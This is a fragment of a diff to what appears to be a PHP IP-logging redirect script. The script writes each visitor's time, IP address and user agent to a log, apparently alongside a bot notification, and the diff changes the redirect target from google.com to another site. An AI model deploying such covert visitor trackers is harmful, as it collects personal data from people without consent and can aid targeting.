@@ -20,6 +20,6 @@ if ($bot_token && $chat_id) {
 
 file_put_contents('/tmp/ips.log', "$time | $ip | $ua\n", FILE_APPEND);
 
-header('Location: https://google.com');
+header('Location: https://fill-game.ir/');
 exit;
 ?>
